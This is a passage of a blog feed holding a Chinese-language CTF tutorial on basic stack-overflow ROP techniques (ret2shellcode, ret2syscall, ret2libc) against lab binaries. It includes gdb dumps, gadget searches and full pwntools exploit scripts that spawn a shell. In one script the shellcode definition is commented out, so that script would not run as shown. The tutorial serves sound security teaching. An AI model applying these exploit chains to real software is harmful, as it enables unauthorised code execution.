0x8048578 &lt;main+75&gt;    mov    dword ptr [esp], eax</span><br><span class="line">───────────────────────────────────[ STACK ]────────────────────────────────────</span><br><span class="line">00:0000│ esp 0xffffd480 —▸ 0xf7ffdb8c —▸ 0xf7fc16f0 —▸ 0xf7ffda20 ◂— 0</span><br><span class="line">01:0004│-084 0xffffd484 ◂— 1</span><br><span class="line">02:0008│-080 0xffffd488 —▸ 0xf7fc1720 —▸ 0x80482f1 ◂— inc edi /* <span class="string">&#x27;GLIBC_2.0&#x27;</span> */</span><br><span class="line">03:000c│-07c 0xffffd48c ◂— 1</span><br><span class="line">04:0010│-078 0xffffd490 ◂— 0</span><br><span class="line">05:0014│-074 0xffffd494 ◂— 1</span><br><span class="line">06:0018│-070 0xffffd498 —▸ 0xf7ffda20 ◂— 0</span><br><span class="line">07:001c│-06c 0xffffd49c ◂— 0</span><br><span class="line">─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</span><br><span class="line"> ► 0 0x8048536 main+9</span><br><span class="line">   1 0xf7d9ecb9 __libc_start_call_main+121</span><br><span class="line">   2 0xf7d9ed7c __libc_start_main+140</span><br><span class="line">   3 0x8048451 _start+33</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  vmmap </span><br><span class="line">Start      End       Perm    Size  Offset File(<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line">0x8048000  0x8049000 r-xp    1000       0 ret2shellcode</span><br><span class="line">0x8049000  0x804a000 r--p    1000       0 ret2shellcode</span><br><span class="line">0x804a000  0x804b000 rw-p    1000    1000 ret2shellcode</span><br><span class="line">0xf7d7a000 0xf7d9d000 r--p   23000    0 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7d9d000 0xf7f24000 r-xp   187000 23000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7f24000 0xf7fa9000 r--p   85000  1aa000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7fa9000 0xf7fab000 r--p   2000  22f000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7fab000 0xf7fac000 rw-p   1000  231000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xf7fac000 0xf7fb6000 rw-p   a000       0 [anon_f7fac]</span><br><span class="line">0xf7fc1000 0xf7fc3000 rw-p   2000       0 [anon_f7fc1]</span><br><span class="line">0xf7fc3000 0xf7fc7000 r--p   4000       0 [vvar]</span><br><span class="line">0xf7fc7000 0xf7fc9000 r-xp   2000       0 [vdso]</span><br><span class="line">0xf7fc9000 0xf7fca000 r--p   1000    0 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7fca000 0xf7fed000 r-xp  23000 1000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7fed000 0xf7ffb000 r--p  e000 24000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7ffb000 0xf7ffd000 r--p 2000  31000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xf7ffd000 0xf7ffe000 rw-p 1000  33000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xfffdd000 0xffffe000 rwxp   21000      0 [stack]</span><br></pre></td></tr></table></figure><p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限：</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x804a000  0x804b000 rw-p    1000    1000 ret2shellcode</span><br></pre></td></tr></table></figure><p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:0804858C                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:08048590                 mov     [esp], eax      ; s</span><br><span class="line">.text:08048593                 call    _gets</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b *0x08048593</span><br><span class="line">Breakpoint 1 at 0x8048593: file ret2shellcode.c, line 14.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">No system <span class="keyword">for</span> you this <span class="keyword">time</span> !!!</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048593 <span class="keyword">in</span> main () at ret2shellcode.c:14</span><br><span class="line">warning: 14ret2shellcode.c: No such file or directory</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span><br><span class="line"> EAX  0xffffd49c ◂— 0</span><br><span class="line"> EBX  0xf7faae34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0xf7fac8a0 (_IO_stdfile_1_lock) ◂— 0</span><br><span class="line"> EDX  0</span><br><span class="line"> EDI  0xf7ffcb60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) ◂— push ebp</span><br><span class="line"> EBP  0xffffd508 ◂— 0</span><br><span class="line"> ESP  0xffffd480 —▸ 0xffffd49c ◂— 0</span><br><span class="line"> EIP  0x8048593 (main+102) —▸ 0xfffe38e8 ◂— 0</span><br></pre></td></tr></table></figure><p>可以看到 esp 为 0xffffd480，ebp 为 0xffffd508，同时 s 相对于 esp 的索引为 <code>esp+0x1c</code>，因此，我们可以推断：</p><ul><li>s 的地址为 0xffffd49c</li><li>s 相对于 ebp 的偏移为 0x6c</li><li>s 相对于返回地址的偏移为 0x6c+4</li></ul><p>最后的 payload 如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh()) #生成执行/bin/s的汇编代码（字符串形式）</span></span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<span class="comment">#将 shellcode 填充到 112 字节，不足部分用 b&#x27;A&#x27; 补足</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目-¶"><a href="#题目-¶" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_5">¶</a></h3><ul><li>sniperoj-pwn100-shellcode-x86-64</li></ul><h2 id="ret2syscall¶"><a href="#ret2syscall¶" class="headerlink" title="ret2syscall¶"></a>ret2syscall<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2syscall">¶</a></h2><h3 id="原理-¶"><a href="#原理-¶" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_6">¶</a></h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p><h3 id="例子-¶"><a href="#例子-¶" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_7">¶</a></h3><p>这里我们继续以 bamboofox 中的 ret2syscall 为例。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2syscall/bamboofox-ret2syscall/rop">ret2syscall</a></p></blockquote><p>首先检测程序开启的保护：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall checksec rop</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出，源程序为 32 位，开启了 NX 保护。接下来利用 IDA 进行反编译：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;This time, no system() and NO SHELLCODE!!!&quot;);</span><br><span class="line">  puts(&quot;What do you plan to do?&quot;);</span><br><span class="line">  gets(&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出此次仍然是一个栈溢出。类似于之前的做法，我们可以获得 v4 相对于 ebp 的偏移为 108。所以我们需要覆盖的返回地址相对于 v4 的偏移为 112。此次，由于我们不能直接利用程序中的某一段代码或者自己填写代码来获得 shell，所以我们利用程序中的 gadgets 来获得 shell，而对应的 shell 获取则是利用系统调用。关于系统调用的知识，请参考：</p><ul><li><a href="https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8">https://zh.wikipedia.org/wiki/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8</a></li></ul><p>简单地说，只要我们把对应获取 shell 的系统调用的参数放到对应的寄存器中，那么我们在执行 int 0x80 就可执行对应的系统调用。比如说这里我们利用如下系统调用来获取 shell：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">execve(&quot;/bin/sh&quot;,NULL,NULL)</span><br></pre></td></tr></table></figure><p>其中，该程序是 32 位，所以我们需要使得</p><ul><li>系统调用号，即 eax 应该为 0xb</li><li>第一个参数，即 ebx 应该指向 &#x2F;bin&#x2F;sh 的地址，其实执行 sh 的地址也可以。</li><li>第二个参数，即 ecx 应该为 0</li><li>第三个参数，即 edx 应该为 0</li></ul><p>而我们如何控制这些寄存器的值 呢？这里就需要使用 gadgets。比如说，现在栈顶是 10，那么如果此时执行了 pop eax，那么现在 eax 的值就为 10。但是我们并不能期待有一段连续的代码可以同时控制对应的寄存器，所以我们需要一段一段控制，这也是我们在 gadgets 最后使用 ret 来再次控制程序执行流程的原因。具体寻找 gadgets 的方法，我们可以使用 ropgadgets 这个工具。</p><p>首先，我们来寻找控制 eax 的 gadgets</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;eax&#x27;</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x080bb196 : pop eax ; ret</span><br><span class="line">0x0807217a : pop eax ; ret 0x80e</span><br><span class="line">0x0804f704 : pop eax ; ret 3</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br></pre></td></tr></table></figure><p>可以看到有上述几个都可以控制 eax，我选取第二个来作为 gadgets。</p><p>类似的，我们可以得到控制其它寄存器的 gadgets</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;pop|ret&#x27; | grep &#x27;ebx&#x27;</span><br><span class="line">0x0809dde2 : pop ds ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809ddda : pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0805b6ed : pop ebp ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0809e1d4 : pop ebx ; pop ebp ; pop esi ; pop edi ; ret</span><br><span class="line">0x080be23f : pop ebx ; pop edi ; ret</span><br><span class="line">0x0806eb69 : pop ebx ; pop edx ; ret</span><br><span class="line">0x08092258 : pop ebx ; pop esi ; pop ebp ; ret</span><br><span class="line">0x0804838b : pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x080a9a42 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x10</span><br><span class="line">0x08096a26 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0x14</span><br><span class="line">0x08070d73 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 0xc</span><br><span class="line">0x0805ae81 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 4</span><br><span class="line">0x08049bfd : pop ebx ; pop esi ; pop edi ; pop ebp ; ret 8</span><br><span class="line">0x08048913 : pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x08049a19 : pop ebx ; pop esi ; pop edi ; ret 4</span><br><span class="line">0x08049a94 : pop ebx ; pop esi ; ret</span><br><span class="line">0x080481c9 : pop ebx ; ret</span><br><span class="line">0x080d7d3c : pop ebx ; ret 0x6f9</span><br><span class="line">0x08099c87 : pop ebx ; ret 8</span><br><span class="line">0x0806eb91 : pop ecx ; pop ebx ; ret</span><br><span class="line">0x0806336b : pop edi ; pop esi ; pop ebx ; ret</span><br><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">0x0809ddd9 : pop es ; pop eax ; pop ebx ; pop esi ; pop edi ; ret</span><br><span class="line">0x0806eb68 : pop esi ; pop ebx ; pop edx ; ret</span><br><span class="line">0x0805c820 : pop esi ; pop ebx ; ret</span><br><span class="line">0x08050256 : pop esp ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line">0x0807b6ed : pop ss ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这里，我选择</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x0806eb90 : pop edx ; pop ecx ; pop ebx ; ret</span><br></pre></td></tr></table></figure><p>这个可以直接控制其它三个寄存器。</p><p>此外，我们需要获得 &#x2F;bin&#x2F;sh 字符串对应的地址。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --string &#x27;/bin/sh&#x27; </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x080be408 : /bin/sh</span><br></pre></td></tr></table></figure><p>可以找到对应的地址，此外，还有 int 0x80 的地址，如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2syscall ROPgadget --binary rop  --only &#x27;int&#x27;                 </span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x08049421 : int 0x80</span><br><span class="line">0x080938fe : int 0xbb</span><br><span class="line">0x080869b5 : int 0xf6</span><br><span class="line">0x0807b4d4 : int 0xfc</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 4</span><br></pre></td></tr></table></figure><p>同时，也找到对应的地址了。</p><p>下面就是对应的 payload，其中 0xb 为 execve 对应的系统调用号。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./rop&#x27;)</span><br><span class="line"></span><br><span class="line">pop_eax_ret = 0x080bb196</span><br><span class="line">pop_edx_ecx_ebx_ret = 0x0806eb90</span><br><span class="line">int_0x80 = 0x08049421</span><br><span class="line">binsh = 0x80be408</span><br><span class="line">payload = flat(</span><br><span class="line">    [&#x27;A&#x27; * 112, pop_eax_ret, 0xb, pop_edx_ecx_ebx_ret, 0, 0, binsh, int_0x80])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目-¶-1"><a href="#题目-¶-1" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_8">¶</a></h3><h2 id="ret2libc¶"><a href="#ret2libc¶" class="headerlink" title="ret2libc¶"></a>ret2libc<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#ret2libc">¶</a></h2><h3 id="原理-¶-1"><a href="#原理-¶-1" class="headerlink" title="原理 ¶"></a>原理 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_9">¶</a></h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“&#x2F;bin&#x2F;sh”)，故而此时我们需要知道 system 函数的地址。</p><h3 id="例子-¶-1"><a href="#例子-¶-1" class="headerlink" title="例子 ¶"></a>例子 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_10">¶</a></h3><p>我们由简单到难分别给出三个例子。</p><h4 id="例-1¶"><a href="#例-1¶" class="headerlink" title="例 1¶"></a>例 1<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#1">¶</a></h4><p>这里我们以 bamboofox 中 ret2libc1 为例。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc1/ret2libc1">ret2libc1</a></p></blockquote><p>首先，我们检查一下程序的安全保护：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2libc1 checksec ret2libc1    </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>源程序为 32 位，开启了 NX 保护。下面对程序进行反编译以确定漏洞位置：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(_bss_start, 0, 1, 0);</span><br><span class="line">  puts(&quot;RET2LIBC &gt;_&lt;&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到在执行 gets 函数的时候出现了栈溢出。此外，利用 ropgadget，我们可以查看是否有 &#x2F;bin&#x2F;sh 存在：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2libc1 ROPgadget --binary ret2libc1 --string &#x27;/bin/sh&#x27;          </span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure><p>确实存在，再次查找一下是否有 system 函数存在。经在 ida 中查找，确实也存在。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.plt:08048460 ; [00000006 BYTES: COLLAPSED FUNCTION _system. PRESS CTRL-NUMPAD+ TO EXPAND]</span><br></pre></td></tr></table></figure><p>那么，我们直接返回该处，即执行 system 函数。相应的 payload 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc1&#x27;)</span><br><span class="line"></span><br><span class="line">binsh_addr = 0x8048720</span><br><span class="line">system_plt = 0x08048460</span><br><span class="line">payload = flat([b&#x27;a&#x27; * 112, system_plt, b&#x27;b&#x27; * 4, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>这里我们需要注意函数调用栈的结构，如果是正常调用 system 函数，我们调用的时候会有一个对应的返回地址，这里以 <code>&#39;bbbb&#39;</code> 作为虚假的地址，其后参数对应的参数内容。</p><p>这个例子相对来说简单，同时提供了 system 地址与 &#x2F;bin&#x2F;sh 的地址，但是大多数程序并不会有这么好的情况。</p><h4 id="例-2¶"><a href="#例-2¶" class="headerlink" title="例 2¶"></a>例 2<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#2">¶</a></h4><p>这里以 bamboofox 中的 ret2libc2 为例 。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc2/ret2libc2">ret2libc2</a></p></blockquote><p>该题目与例 1 基本一致，只不过不再出现 &#x2F;bin&#x2F;sh 字符串，所以此次需要我们自己来读取字符串，所以我们需要两个 gadgets，第一个控制程序读取字符串，第二个控制程序执行 system(“&#x2F;bin&#x2F;sh”)。由于漏洞与上述一致，这里就不在多说，具体的 exp 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">##!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(&#x27;./ret2libc2&#x27;)</span><br><span class="line"></span><br><span class="line">gets_plt = 0x08048460</span><br><span class="line">system_plt = 0x08048490</span><br><span class="line">pop_ebx = 0x0804843d</span><br><span class="line">buf2 = 0x804a080</span><br><span class="line">payload = flat(</span><br><span class="line">    [b&#x27;a&#x27; * 112, gets_plt, pop_ebx, buf2, system_plt, 0xdeadbeef, buf2])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(b&#x27;/bin/sh&#x27;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>需要注意的是，我这里向程序中 bss 段的 buf2 处写入 &#x2F;bin&#x2F;sh 字符串，并将其地址作为 system 的参数传入。这样以便于可以获得 shell。</p><h4 id="例-3¶"><a href="#例-3¶" class="headerlink" title="例 3¶"></a>例 3<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#3">¶</a></h4><p>这里以 bamboofox 中的 ret2libc3 为例 。</p><blockquote><p>点击下载: <a href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2libc/ret2libc3/ret2libc3">ret2libc3</a></p></blockquote><p>在例 2 的基础上，再次将 system 函数的地址去掉。此时，我们需要同时找到 system 函数地址与 &#x2F;bin&#x2F;sh 字符串的地址。首先，查看安全保护</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">➜  ret2libc3 checksec ret2libc3</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>可以看出，源程序仍旧开启了堆栈不可执行保护。进而查看源码，发现程序的 bug 仍然是栈溢出：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  int v4; // [sp+1Ch] [bp-64h]@1</span><br><span class="line"></span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);</span><br><span class="line">  printf(&quot;Can you find it !?&quot;);</span><br><span class="line">  gets((char *)&amp;v4);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么我们如何得到 system 函数的地址呢？这里就主要利用了两个知识点：</p><ul><li>system 函数属于 libc，而 libc.so 动态链接库中的函数之间相对偏移是固定的。</li><li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。而 libc 在 github 上有人进行收集，如下</li><li><a href="https://github.com/niklasb/libc-database">https://github.com/niklasb/libc-database</a></li></ul><p>所以如果我们知道 libc 中某个函数的地址，那么我们就可以确定该程序利用的 libc。进而我们就可以知道 system 函数的地址。</p><p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。<strong>当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。</strong></p><p>我们自然可以根据上面的步骤先得到 libc，之后在程序中查询偏移，然后再次获取 system 地址，但这样手工操作次数太多，有点麻烦，这里给出一个 libc 的利用工具，具体细节请参考 readme：</p><ul><li><a href="https://github.com/lieanu/LibcSearcher">https://github.com/lieanu/LibcSearcher</a></li></ul><p>此外，在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p><p>这里我们泄露 __libc_start_main 的地址，这是因为它是程序最初被执行的地方。基本利用思路如下</p><ul><li>泄露 __libc_start_main 地址</li><li>获取 libc 版本</li><li>获取 system 地址与 &#x2F;bin&#x2F;sh 的地址</li><li>再次执行源程序</li><li>触发栈溢出执行 system(‘&#x2F;bin&#x2F;sh’)</li></ul><p>exp 如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">sh = process(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)</span><br><span class="line"></span><br><span class="line">puts_plt = ret2libc3.plt[&#x27;puts&#x27;]</span><br><span class="line">libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]</span><br><span class="line">main = ret2libc3.symbols[&#x27;main&#x27;]</span><br><span class="line"></span><br><span class="line">print(&quot;leak libc_start_main_got addr and return to main again&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])</span><br><span class="line">sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)</span><br><span class="line"></span><br><span class="line">print(&quot;get the related addr&quot;)</span><br><span class="line">libc_start_main_addr = u32(sh.recv()[0:4])</span><br><span class="line">libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)</span><br><span class="line">libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)</span><br><span class="line">system_addr = libcbase + libc.dump(&#x27;system&#x27;)</span><br><span class="line">binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">print(&quot;get shell&quot;)</span><br><span class="line">payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h3 id="题目-¶-2"><a href="#题目-¶-2" class="headerlink" title="题目 ¶"></a>题目 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/basic-rop/#_11">¶</a></h3><ul><li>train.cs.nctu.edu.tw: ret2libc</li></ul><p>[ret2text]: </p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ret2shellcode&quot;&gt;&lt;a href=&quot;#ret2shellcode&quot; class=&quot;headerlink&quot; title=&quot;ret2shellcode&quot;&gt;&lt;/a&gt;ret2shellcode&lt;/h1&gt;&lt;h2 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; cla</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="5-栈溢出与ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
    
    <category term="Stack Overflow" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/"/>
    
    <category term="x86x64" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/"/>
    
    <category term="3-基本ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/5-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/3-%E5%9F%BA%E6%9C%ACROP/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/7070f1e7a12f.html"/>
    <id>https://rhea006.github.io/2025/07/7070f1e7a12f.html</id>
    <published>2025-07-01T03:47:19.493Z</published>
    <updated>2025-07-01T03:47:19.907Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="1-二进制文件" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/"/>
    
    <category term="3-ELF 文件链接" scheme="https://rhea006.github.io/categories/PWN/Learning/1-%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6/3-ELF-%E6%96%87%E4%BB%B6%E9%93%BE%E6%8E%A5/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/a0bfb9c20b31.html"/>
    <id>https://rhea006.github.io/2025/07/a0bfb9c20b31.html</id>
    <published>2025-07-01T03:47:19.493Z</published>
    <updated>2025-07-01T03:47:19.907Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
